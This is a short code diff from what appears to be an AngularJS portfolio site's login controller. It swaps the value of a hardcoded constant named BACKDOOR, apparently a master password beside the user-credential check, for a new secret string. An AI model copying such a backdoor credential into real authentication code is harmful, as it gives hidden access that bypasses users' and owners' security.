@@ -428,7 +428,7 @@ angular.module('portfolio.controllers', [])
 
     var username = user.slug.toLowerCase();
     var authuserdata;
-    var BACKDOOR = 'Artfinder2014$ecretK3y!';
+    var BACKDOOR = 'wielP4o';
 
     // Fetch login details, compare with details entered by user
     RemoteDataProvider.fetchAuthDataForUser(username).then(function(data_user) {
